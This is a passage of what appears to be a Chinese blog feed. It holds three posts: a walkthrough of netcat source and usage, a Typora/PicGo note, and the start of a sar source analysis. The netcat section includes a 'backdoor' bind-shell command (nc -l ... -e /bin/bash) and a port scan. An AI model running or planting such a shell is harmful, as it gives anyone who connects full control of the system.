c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>  NETCAT_PROTO_UNSPEC,<br>  NETCAT_PROTO_TCP,<br>  NETCAT_PROTO_UDP<br>&#125; <span class="hljs-type">nc_proto_t</span>;<br></code></pre></td></tr></table></figure><h3 id="1-3、主机以及端口存储结构"><a href="#1-3、主机以及端口存储结构" class="headerlink" title="1.3、主机以及端口存储结构"></a>1.3、主机以及端口存储结构</h3><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 这是标准的netcat主机记录。 它包含一个&#x27;权威&#x27;名称字段，该字段可以为空，</span><br><span class="hljs-comment"> * 以及网络符号和点分字符串符号中的IP地址列表。*/</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  <span class="hljs-type">char</span> name[MAXHOSTNAMELEN];<span class="hljs-comment">/* DNS名称 */</span><br>  <span class="hljs-type">char</span> addrs[MAXINETADDRS][NETCAT_ADDRSTRLEN];<span class="hljs-comment">/* ascii格式的IP地址 */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_addr</span> <span class="hljs-title">iaddrs</span>[<span class="hljs-title">MAXINETADDRS</span>];</span><span class="hljs-comment">/* 真实地址 */</span><br>&#125; <span class="hljs-type">nc_host_t</span>;<br><br><span class="hljs-comment">/* 标准netcat端口记录。 它包含端口名称（可以为空）以及端口号（以数字和字符串形式） */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  <span class="hljs-type">char</span> name[NETCAT_MAXPORTNAMELEN];<span class="hljs-comment">/* 规范端口名称 */</span><br>  <span class="hljs-type">char</span> ascnum[<span class="hljs-number">8</span>];<span class="hljs-comment">/* ascii端口号 */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> num;<span class="hljs-comment">/* 端口号 */</span><br>  <span class="hljs-comment">/* FIXME：这只是一个测试! */</span><br>  <span class="hljs-type">in_port_t</span> netnum;<span class="hljs-comment">/* 网络字节顺序的端口号 */</span><br>&#125; <span class="hljs-type">nc_port_t</span>;<br><br></code></pre></td></tr></table></figure><h3 id="1-4、网络连接Socker存储结构"><a href="#1-4、网络连接Socker存储结构" class="headerlink" title="1.4、网络连接Socker存储结构"></a>1.4、网络连接Socker存储结构</h3><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  <span class="hljs-type">int</span> fd, domain, timeout;<br>  <span class="hljs-type">nc_proto_t</span> proto;<br>  <span class="hljs-type">nc_host_t</span> local_host, host;<br>  <span class="hljs-type">nc_port_t</span> local_port, port;<br>  <span class="hljs-type">nc_buffer_t</span> sendq, recvq;<br>&#125; <span class="hljs-type">nc_sock_t</span>;<br></code></pre></td></tr></table></figure><h3 id="1-5、数据缓存与IO读写"><a href="#1-5、数据缓存与IO读写" class="headerlink" title="1.5、数据缓存与IO读写"></a>1.5、数据缓存与IO读写</h3><p>数据缓存的结构体如下所示：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 用于队列缓冲和数据跟踪。 &#x27;head&#x27;字段是指向缓冲区段开始的指针，而&#x27;pos&#x27;表示数据流的实际位置。 </span><br><span class="hljs-comment"> * 如果&#x27;head&#x27;为NULL，则意味着该缓冲区中没有动态分配的数据，但是它可能仍包含一些本地数据段</span><br><span class="hljs-comment"> * （例如，在堆栈内部分配）。 &#x27;len&#x27;表示从&#x27;pos&#x27;开始的缓冲区的长度。</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *head;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *pos;<br>  <span class="hljs-type">int</span> len;<br>&#125; <span class="hljs-type">nc_buffer_t</span>;<br></code></pre></td></tr></table></figure><p>网络IO的主要的处理函数为<code>int core_readwrite(nc_sock_t *nc_main, nc_sock_t *nc_slave)</code>，该函数循环操作网络IO，相关部分代码如下所示：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 处理标准输入/标准输出/网络IO. */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">core_readwrite</span><span class="hljs-params">(<span class="hljs-type">nc_sock_t</span> *nc_main, <span class="hljs-type">nc_sock_t</span> *nc_slave)</span> &#123;<br>    <span class="hljs-type">int</span> fd_stdin, fd_stdout, fd_sock, fd_max;<br>    <span class="hljs-type">int</span> read_ret, write_ret;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>];<br>    <span class="hljs-type">bool</span> inloop = TRUE;<br><br><span class="hljs-comment">/* IO类型判断等代码省略... */</span><br><br>    <span class="hljs-keyword">while</span> (inloop) &#123;<br>        <span class="hljs-type">bool</span> call_select = TRUE;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">recv_addr</span>;</span> <span class="hljs-comment">/* 仅由UDP协议使用 */</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> recv_len = <span class="hljs-keyword">sizeof</span>(recv_addr);<br><br>        <span class="hljs-comment">/* 终端信号处理及io队列判断等代码省略... */</span><br><br>        <span class="hljs-comment">/* 出于优化原因，我们为两个接收队列都有一个公共缓冲区，</span><br><span class="hljs-comment">         * 因此，现在可以处理数据，因此该缓冲区可用于其他套接字事件. */</span><br>        <span class="hljs-keyword">if</span> (nc_slave-&gt;recvq.len &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-comment">/* 省略部分代码... */</span><br>            <span class="hljs-comment">/* 如果远程发送队列为空，则将整个数据块移至此处 */</span><br>            <span class="hljs-keyword">if</span> (rem_sendq-&gt;len == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-comment">/* 省略部分代码... */</span><br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!my_recvq-&gt;head) &#123;<br>                <span class="hljs-comment">/* 将数据块移动到专用的分配空间中 */</span><br>                debug_v((<span class="hljs-string">&quot;  reallocating %d data bytes in slave-&gt;recvq&quot;</span>,<br>                         my_recvq-&gt;len));<br>                my_recvq-&gt;head = <span class="hljs-built_in">malloc</span>(my_recvq-&gt;len);<br>                <span class="hljs-built_in">memcpy</span>(my_recvq-&gt;head, my_recvq-&gt;pos, my_recvq-&gt;len);<br>                my_recvq-&gt;pos = my_recvq-&gt;head;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">/* 从标准输入读取，现在由于与上述相同的原因而处理nc_slave sendq。 </span><br><span class="hljs-comment">         * 可能会有一个公共缓冲区在队列中移动，因此，如果是这种情况，请对其</span><br><span class="hljs-comment">         * 进行处理，以便可以重复使用。如果必须延迟更多时间，请将其复制到</span><br><span class="hljs-comment">         * 动态分配的空间中. */</span><br>        <span class="hljs-keyword">if</span> (nc_main-&gt;sendq.len &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-comment">/* 省略部分代码... */</span><br>            write_ret = write(fd_sock, data, data_len);<br>            <span class="hljs-keyword">if</span> (write_ret &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">if</span> (errno == EAGAIN)<br>                    write_ret = <span class="hljs-number">0</span>; <span class="hljs-comment">/* 写会阻塞，将其附加以选择 */</span><br>                <span class="hljs-keyword">else</span> &#123;<br>                    perror(<span class="hljs-string">&quot;write(net)&quot;</span>);<br>                    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>                &#125;<br>            &#125;<br><br>        &#125;<br><br>        <span class="hljs-comment">/* 从套接字（网络）读取 */</span><br>        <span class="hljs-keyword">if</span> (call_select &amp;&amp; FD_ISSET(fd_sock, &amp;ins)) &#123;<br>            <span class="hljs-keyword">if</span> ((nc_main-&gt;proto == NETCAT_PROTO_UDP) &amp;&amp; opt_zero) &#123;<br>                <span class="hljs-built_in">memset</span>(&amp;recv_addr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(recv_addr));<br>                <span class="hljs-comment">/* 这使我们能够从不同的地址获取数据包 */</span><br>                read_ret = recvfrom(fd_sock, buf, <span class="hljs-keyword">sizeof</span>(buf), <span class="hljs-number">0</span>,<br>                                    (<span class="hljs-keyword">struct</span> sockaddr *)&amp;recv_addr, &amp;recv_len);<br>                <span class="hljs-comment">/* 当recvfrom（）调用失败时，recv_addr保持不变 */</span><br>                debug_dv((<span class="hljs-string">&quot;recvfrom(net) = %d (address=%s:%d)&quot;</span>, read_ret,<br>                          netcat_inet_ntop(&amp;recv_addr.sin_addr),<br>                          ntohs(recv_addr.sin_port)));<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">/* 通用文件读取回退 */</span><br>                read_ret = read(fd_sock, buf, <span class="hljs-keyword">sizeof</span>(buf));<br>                debug_dv((<span class="hljs-string">&quot;read(net) = %d&quot;</span>, read_ret));<br>            &#125;<br><br>            <span class="hljs-comment">/* 省略部分代码... */</span><br>        &#125;<br><br>        <span class="hljs-comment">/* 处理网络接收队列 */</span><br>        <span class="hljs-keyword">if</span> (nc_main-&gt;recvq.len &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-type">nc_buffer_t</span> *my_recvq = &amp;nc_main-&gt;recvq;<br>            <span class="hljs-type">nc_buffer_t</span> *rem_sendq = &amp;nc_slave-&gt;sendq;<br><br>            <span class="hljs-comment">/* 检查telnet代码（如果启用）。</span><br><span class="hljs-comment">             * 请注意，缓冲的输出间隔不适用于telnet代码答案 */</span><br>            <span class="hljs-keyword">if</span> (opt_telnet) netcat_telnet_parse(nc_main);<br><br>            <span class="hljs-comment">/* telnet解析可能返回0个字符! */</span><br>            <span class="hljs-keyword">if</span> (my_recvq-&gt;len &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-comment">/* 如果远程发送队列为空，则将整个数据块移至此处 */</span><br>                <span class="hljs-keyword">if</span> (rem_sendq-&gt;len == <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-built_in">memcpy</span>(rem_sendq, my_recvq, <span class="hljs-keyword">sizeof</span>(*rem_sendq));<br>                    <span class="hljs-built_in">memset</span>(my_recvq, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(*my_recvq));<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!my_recvq-&gt;head) &#123;<br>                    <span class="hljs-comment">/* 将数据块移动到专用的分配空间中 */</span><br>                    my_recvq-&gt;head = <span class="hljs-built_in">malloc</span>(my_recvq-&gt;len);<br>                    <span class="hljs-built_in">memcpy</span>(my_recvq-&gt;head, my_recvq-&gt;pos, my_recvq-&gt;len);<br>                    my_recvq-&gt;pos = my_recvq-&gt;head;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">/* 省略部分代码... */</span><br><br>    &#125;<br><br>    <span class="hljs-comment">/* 我们从网上得到了EOF，请关闭 */</span><br>    shutdown(fd_sock, SHUT_RDWR);<br>    close(fd_sock);<br>    nc_main-&gt;fd = <span class="hljs-number">-1</span>;<br><br>    <span class="hljs-comment">/* 仅在不是模拟时才关闭从属套接字 */</span><br>    <span class="hljs-keyword">if</span> (nc_slave-&gt;domain != PF_UNSPEC) &#123;<br>        shutdown(fd_stdin, SHUT_RDWR);<br>        close(fd_stdin);<br>        nc_slave-&gt;fd = <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* 恢复外部信号处理程序 */</span><br>    signal_handler = TRUE;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <span class="hljs-comment">/* core_readwrite（）的结尾 */</span><br></code></pre></td></tr></table></figure><h2 id="二、参数解析"><a href="#二、参数解析" class="headerlink" title="二、参数解析"></a>二、参数解析</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">usage: nc [-46AacCDdEFhklMnOortUuvz] [-K tc] [-b boundif] [-i interval] [-p source_port] [--apple-delegate-pid pid] [--apple-delegate-uuid uuid]<br>  [-s source_ip_address] [-w timeout] [-X proxy_version]<br>  [-x proxy_address[:port]] [hostname] [port[s]]<br></code></pre></td></tr></table></figure><ul><li><code>-4</code>：使用IPv4；</li><li><code>-6</code>：使用IPv6；</li><li><code>-A</code>：在套接字上设置SO_RECV_ANYIF；</li><li><code>-a</code>：在套接字上设置SO_AWDL_UNRESTRICTED；</li><li><code>-b</code>：将套接字绑定到指定的接口，需要附带参数；</li><li><code>-c</code>：发送CRLF作为行尾；</li><li><code>-C</code>：不要使用蜂窝数据连接？？？</li><li><code>-D</code>：启用调试套接字选项；</li><li><code>-d</code>：后台运行；</li><li><code>-E</code>：Don’t use expensive interfaces；</li><li><code>-F</code>：Do not use flow advisory (flow adv enabled by default)；</li><li><code>-G</code>：连接超时时间（秒）</li><li><code>-h</code>：显示帮助</li><li><code>-H</code>：初始化空闲超时时间（秒），需要附带参数；</li><li><code>-I</code>：重复空闲超时的间隔（秒），需要附带参数；</li><li><code>-i</code>：发送线路、扫描端口的延迟间隔，需要附带参数；</li><li><code>-J</code>：重复空闲超时的次数，需要附带参数；</li><li><code>-k</code>：为多个连接保持入站套接字打开；</li><li><code>-K</code>：指定流量类别，需要附带参数；</li><li><code>-l</code>：侦听模式，用于入站连接；</li><li><code>-L</code>：生成读取超时事件之前要发送的探测数，需要附带参数；</li><li><code>-m</code>：在套接字上设置SO_INTCOPROC_ALLOW；</li><li><code>-n</code>：禁止名称&#x2F;端口解析；</li><li><code>-M</code>：使用MULTIPATH域套接字；</li><li><code>-N</code>：生成写超时事件之前要发送的探测数，需要附带参数；</li><li><code>-O</code>：使用老式的connect代替connectx；</li><li><code>-p</code>：指定用于远程连接的本地端口（不能与-l一起使用），需要指定参数；</li><li><code>-r</code>：随机化远程端口；</li><li><code>-s</code>：本地源地址，需要附带参数；</li><li><code>-t</code>：回复Telnet请求；</li><li><code>-U</code>：使用Unix域套接字</li><li><code>-u</code>：UDP模式；</li><li><code>-v</code>：详细信息模式；</li><li><code>-w</code>：连接和最终网络读取超时，需要附带参数；</li><li><code>-X</code>：代理协议，可选参数为socks4、socks5或connect；</li><li><code>-x</code>：指定代理地址和端口；</li><li><code>-z</code>：零I&#x2F;O模式[用于扫描]；</li><li><code>-o</code>：连接&#x2F;绑定后发出套接字选项；</li><li><code>--apple-delegate-pid</code>：使用pid将socket设置为委托；</li></ul><h2 id="三、常用指令"><a href="#三、常用指令" class="headerlink" title="三、常用指令"></a>三、常用指令</h2><h3 id="3-1、文件传输"><a href="#3-1、文件传输" class="headerlink" title="3.1、文件传输"></a>3.1、文件传输</h3><p>接收数据的机器：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">nc -4l 54321 &gt; recv.file<br></code></pre></td></tr></table></figure><p>发送数据的机器：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">nc 192.168.1.100 54321 &lt; send.file<br></code></pre></td></tr></table></figure><h3 id="3-2、端口连通性检测"><a href="#3-2、端口连通性检测" class="headerlink" title="3.2、端口连通性检测"></a>3.2、端口连通性检测</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 可使用 -u 检测UDP端口</span><br>nc -v 192.168.1.100 54321<br></code></pre></td></tr></table></figure><h3 id="3-3、连接端口"><a href="#3-3、连接端口" class="headerlink" title="3.3、连接端口"></a>3.3、连接端口</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 可使用 -u 连接UDP端口</span><br>nc -4l 192.168.1.100 54321<br></code></pre></td></tr></table></figure><h3 id="3-4、聊天室"><a href="#3-4、聊天室" class="headerlink" title="3.4、聊天室"></a>3.4、聊天室</h3><p>服务器端：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">nc -4l 54321<br></code></pre></td></tr></table></figure><p>客户端：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">nc 192.168.1.100 54321<br></code></pre></td></tr></table></figure><h3 id="3-5、代理服务器"><a href="#3-5、代理服务器" class="headerlink" title="3.5、代理服务器"></a>3.5、代理服务器</h3><p>目前有三台机器A（<code>192.168.1.100</code>）、B（<code>192.168.1.101</code>）、C（<code>192.168.1.102</code>），现在需要把<code>B</code>当作代理服务器，把发送到<code>B</code>的<code>80</code>端口的流量全部转发到<code>C</code>的<code>8080</code>端口，确保<code>C</code>的<code>8080</code>端口处于监听状态，执行步骤如下：</p><h4 id="3-5-1、单向管道"><a href="#3-5-1、单向管道" class="headerlink" title="3.5.1、单向管道"></a>3.5.1、单向管道</h4><ul><li><p>在B上执行如下指令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">nc -l 80 | nc 192.168.1.102 8080<br></code></pre></td></tr></table></figure></li></ul><h4 id="3-5-2、双向管道"><a href="#3-5-2、双向管道" class="headerlink" title="3.5.2、双向管道"></a>3.5.2、双向管道</h4><ul><li><p>在B上执行如下指令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkfifo</span> 2way<br>nc -4l 80 0&lt;2way | nc 192.168.1.100 8080 1&gt;2way<br><br></code></pre></td></tr></table></figure></li></ul><h3 id="3-6、nc后门-反弹Shell"><a href="#3-6、nc后门-反弹Shell" class="headerlink" title="3.6、nc后门(反弹Shell)"></a>3.6、nc后门(反弹Shell)</h3><p>服务器端创建后门的命令：-e&#96; 标志将一个 bash 与端口 10000 相连。现在客户端只要连接到服务器上的 10000 端口就能通过 bash 获取我们系统的完整访问权限：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">nc -4l 54321 -e /bin/bash<br><br></code></pre></td></tr></table></figure><p>客户端连接后即可执行正常的Shell指令，连接指令如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">nc 192.168.1.100 54321<br><br></code></pre></td></tr></table></figure><h3 id="3-7、扫描端口"><a href="#3-7、扫描端口" class="headerlink" title="3.7、扫描端口"></a>3.7、扫描端口</h3><p>扫描目标IP的制定的端口范围；</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">nc -v -z -n -w 1 192.168.1.100 1-1023<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 常用命令 </tag>
            
            <tag> nc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typora与PicGo的使用笔记</title>
      <link href="/2019/09/22/typora-picgo/"/>
      <url>/2019/09/22/typora-picgo/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Typora"><a href="#一、Typora" class="headerlink" title="一、Typora"></a>一、Typora</h2><p><a href="https://typora.io/">Typora</a>是一款极简的Markdown写作编辑器，相比于传统的双栏目预览式编辑，Typora巧妙的实现了一种所见即所得的编辑模式，关于这款工具的详细的介绍，以及它与其他工具的对比，在网上到处都是，这里就不赘述了。我只简单的描述以下我对这个编辑的印象与评价。</p><ul><li>优点：<ul><li>风格极简，支持几种主流的主题风格，同时支持主题自定义；</li><li>所见即所得的创新的写作风格体验；</li><li>支持文档导出为多种格式，PDF，HTML，Word等；</li><li>支持LaTex公式；</li></ul></li><li>待改进：<ul><li>文档列表新建文件的按钮有时候会无响应，点击多次才能新建文件；</li><li>图片插入目前只支持iPic这款付费插件，诸如PicGo还不支持；</li></ul></li></ul><h2 id="二、PicGo"><a href="#二、PicGo" class="headerlink" title="二、PicGo"></a>二、PicGo</h2><p><a href="https://github.com/Molunerfinn/PicGo">PicGo</a>是一款开源的图床软件，该软件与iPic的不分伯仲，目前支持众多图床（SM.MS图床，腾讯云COS，微博图床，GitHub图床，七牛图床，Imgur图床，阿里云OSS，又拍云图床等），这里简单表述一下我的个人使用体验。</p><ul><li>优点：<ul><li>项目开源，文档支持中文，比较齐全；</li><li>支持插件，用户可根据自己需要自定义插件；</li></ul></li></ul><h2 id="三、结合使用"><a href="#三、结合使用" class="headerlink" title="三、结合使用"></a>三、结合使用</h2><p>由于公司内部使用GitLab，在记录一下issue的时候，相关图片又不便于存放在外网，在使用Typora的时候则需要图片信息能够自动保存在公司内部的GitLab中，因此不可避免的便需要Typora与PicGo的相互结合，目前Typora并没有支持PicGo的图片来源扩展，鉴于PicGo支持插件开发，所以充分利用的PicGo的插件来实现公司文档的便捷文档编写。</p><h3 id="3-1、PicGo的配置与插件"><a href="#3-1、PicGo的配置与插件" class="headerlink" title="3.1、PicGo的配置与插件"></a>3.1、PicGo的配置与插件</h3><ul><li><p>配置：</p><ul><li><code>链接格式</code>：在上传区的链接格式中将返回的数据格式选中为<code>Markdown</code>；</li><li><code>快捷键</code>：配置上传剪贴板图片的快捷键<code>Option + S</code>;</li></ul></li><li><p>插件：</p><ul><li><code>picgo-plugin-gitlab</code>：基于picgo-plugin-web-uploader开发，配置项目简单化，将图片上传到内部GitLab的指定的项目中，并返回图片的绝对URL；</li><li><code>picgo-plugin-autocopy</code>：自动复制上传完成后图片返回的URL地址；</li></ul></li></ul><h3 id="3-2、实际体验"><a href="#3-2、实际体验" class="headerlink" title="3.2、实际体验"></a>3.2、实际体验</h3><ul><li><p>截屏获取图片；</p></li><li><p>执行<code>Option + s</code>上传剪贴板的图片信息；</p></li><li><p>待图片上传完成后，在Typora编辑器中直接<code>Command + v</code>粘贴图片（实际写入的为Markdown格式）即可；</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Markdown </tag>
            
            <tag> Typora </tag>
            
            <tag> PicGo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sar指令的使用与源码解析 - 每周指令</title>
      <link href="/2019/09/19/command-sar/"/>
      <url>/2019/09/19/command-sar/</url>
      
        <content type="html"><![CDATA[<p><code>sar</code> 的全称是 <code>System Activity Reporter</code>（系统活动情况报告）的缩写。<code>sar</code>工具将对系统当前的状态进行取样，然后通过计算数据和比例来表达系统的当前运行状态。它的特点是可以连续对系统取样，获得大量的取样数据；取样数据分析的结果都可以存入文件， 所需的负载很小。<code>sar</code>是目前 Linux 上最为全面的系统性能分析工具之一，可以从 14 个大方面对系统的活动进行报告，包括文件的读写情况、系统调用的使用情况、串口、CPU 效率、内存使用状况、进程活动及IPC有关的活动等，使用也是较为复杂。</p><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p><code>sar</code>是查看操作系统报告指标的各种工具中，最为普遍和方便的；它有两种用法；</p><ul><li>追溯过去的统计数据（默认）</li><li>周期性的查看当前数据</li></ul><p><code>sar</code>只是<a href="https://github.com/sysstat/sysstat">sysstat</a>（最新版本为<a href="https://github.com/sysstat/sysstat/tree/v12.1.6">v12.1.6</a>）软件包中的一个工具，<code>sar</code>相关的工具还包括<code>sadc</code>、<code>sa1</code>、<code>sa2</code>：</p><ul><li><code>sadc</code>：系统动态数据收集工具，收集的数据被写入一个二进制文件中，它是<code>sar</code>工具后端；</li><li><code>sa1</code>：将每日的系统活动信息以二进制数据的形式写入到文件中，由<code>cron</code>调用，默认的<code>cron</code>作业位于<code>/etc/cron.d/sysstat</code>；</li><li><code>sa2</code>：在 <code>/var/log/sa</code> 目录中每日写入一个报告，由<code>cron</code>调用，默认的<code>cron</code>作业位于<code>/etc/cron.d/sysstat</code>；</li><li><code>sar</code>：负责解析<code>sadc</code>保存的数据，并显示出来；</li></ul><h2 id="二、源码分析"><a href="#二、源码分析" class="headerlink" title="二、源码分析"></a>二、源码分析</h2><h3 id="2-1、sadc：系统动态数据采集工具"><a href="#2-1、sadc：系统动态数据采集工具" class="headerlink" title="2.1、sadc：系统动态数据采集工具"></a>2.1、sadc：系统动态数据采集工具</h3><ul><li><p>文件：<code>sadc.c</code>（<code>rw_sa_stat_loop()</code>函数和<code>read_stats()</code>函数） 和 <code>activity.c</code>（<code>act[]</code>结构体）；</p></li><li><p>功能：解析参数、启动一个interval alarm、rw_sa_stat_loop()读取数据；</p></li><li><p>核心函数&#x2F;代码：</p><ul><li><code>rw_sa_stat_loop()</code>：整个<code>sadc</code>的核心循环，这里从个<code>sysfs</code>读取信息，并提取关键信息，然后保存；</li><li><code>read_stats()</code>：核心采集数据函数，核心数据结构式<code>act[]</code>；</li><li><code>act[]</code>：存放了所有统计事件的<code>struct activity</code>；</li></ul></li><li><p>代码解析：</p></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// sadc.c</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> ***************************************************************************</span><br><span class="hljs-comment"> * 主循环：从相关来源读取统计数据并显示它们。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * IN：</span><br><span class="hljs-comment"> * @count要显示的统计数据行数。</span><br><span class="hljs-comment"> * @rectime当前日期和时间。</span><br><span class="hljs-comment"> * @stdfdStdout文件描述符。</span><br><span class="hljs-comment"> * @ofd输出文件描述符。</span><br><span class="hljs-comment"> * @ofile输出文件的名称。 </span><br><span class="hljs-comment"> ***************************************************************************</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">rw_sa_stat_loop</span><span class="hljs-params">(<span class="hljs-type">long</span> count, <span class="hljs-keyword">struct</span> tm *rectime, <span class="hljs-type">int</span> stdfd, <span class="hljs-type">int</span> ofd,</span><br><span class="hljs-params">     <span class="hljs-type">char</span> ofile[])</span><br>&#123;<br><span class="hljs-comment">/* 此处省略部分代码 */</span><br><br><span class="hljs-comment">/* 为SIGINT设置处理程序 */</span><br><span class="hljs-built_in">memset</span>(&amp;int_act, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(int_act));<br>int_act.sa_handler = (<span class="hljs-type">void</span> *) int_handler;<br>sigaction(SIGINT, &amp;int_act, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-comment">/* 主循环 */</span><br><span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-comment">/* 此处省略部分代码 */</span><br><br>    <span class="hljs-comment">/* 读取然后写入统计数据 */</span><br>read_stats();<br><br><span class="hljs-comment">/* 此处省略部分代码 */</span><br><br>    <span class="hljs-comment">/* 如果记录类型为R_LAST_STATS，则在写入之前将其标记为R_STATS */</span><br>record_hdr.record_type = R_STATS;<br><span class="hljs-keyword">if</span> (ofile[<span class="hljs-number">0</span>]) &#123;<br>      <span class="hljs-comment">// 将结果写到指定文件中</span><br>write_stats(ofd);<br>&#125;<br><br><span class="hljs-comment">/* 此处省略部分代码 */</span><br><span class="hljs-keyword">if</span> (count) &#123;<br>      <span class="hljs-comment">// 此处和alarm()配合达到周期性采样的效果</span><br>pause();<br>&#125;<br><br><span class="hljs-comment">/* 必要时旋转活动文件 */</span><br><span class="hljs-keyword">if</span> (WANT_SA_ROTAT(flags)) &#123;<br><span class="hljs-comment">/* 用户指定&#x27; -&#x27;作为要使用的文件名 */</span><br>set_default_file(rectime, new_ofile, <span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(ofile, new_ofile)) &#123;<br>do_sa_rotat = TRUE;<br>&#125;<br>&#125;<br>&#125;<br>  <span class="hljs-comment">// 达到总采样数，同样停止采样</span><br><span class="hljs-keyword">while</span> (count);<br><br><span class="hljs-comment">/* 关闭文件描述符，如果它们实际已被使用 */</span><br>CLOSE(stdfd);<br>CLOSE(ofd);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// activity.c</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">activity</span> *<span class="hljs-title">act</span>[<span class="hljs-title">NR_ACT</span>] =</span> &#123;<br>    &amp;cpu_act,<br>    &amp;pcsw_act,<br>    &amp;irq_act,<br>    &amp;swap_act,<br>    &amp;paging_act,<br>    &amp;io_act,<br>    &amp;memory_act,<br>    &amp;huge_act,<br>    &amp;ktables_act,<br>    &amp;queue_act,<br>    &amp;serial_act,<br>    &amp;disk_act,<br>    <span class="hljs-comment">/* &lt;network&gt; */</span><br>    &amp;net_dev_act,<br>    &amp;net_edev_act,<br>    &amp;net_nfs_act,<br>    &amp;net_nfsd_act,<br>    &amp;net_sock_act,<br>    &amp;net_ip_act,<br>    &amp;net_eip_act,<br>    &amp;net_icmp_act,<br>    &amp;net_eicmp_act,<br>    &amp;net_tcp_act,<br>    &amp;net_etcp_act,<br>    &amp;net_udp_act,<br>    &amp;net_sock6_act,<br>    &amp;net_ip6_act,<br>    &amp;net_eip6_act,<br>    &amp;net_icmp6_act,<br>    &amp;net_eicmp6_act,<br>    &amp;net_udp6_act,<br>    &amp;fchost_act,<br>    &amp;softnet_act,    <span class="hljs-comment">/* AO_CLOSE_MARKUP */</span><br>    <span class="hljs-comment">/* &lt;/network&gt; */</span><br>    <span class="hljs-comment">/* &lt;power-management&gt; */</span><br>    &amp;pwr_cpufreq_act,<br>    &amp;pwr_fan_act,<br>    &amp;pwr_temp_act,<br>    &amp;pwr_in_act,<br>    &amp;pwr_wghfreq_act,<br>    &amp;pwr_usb_act,        <span class="hljs-comment">/* AO_CLOSE_MARKUP */</span><br>    <span class="hljs-comment">/* &lt;/power-management&gt; */</span><br>    &amp;filesystem_act<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="2-2、sar显示统计信息"><a href="#2-2、sar显示统计信息" class="headerlink" 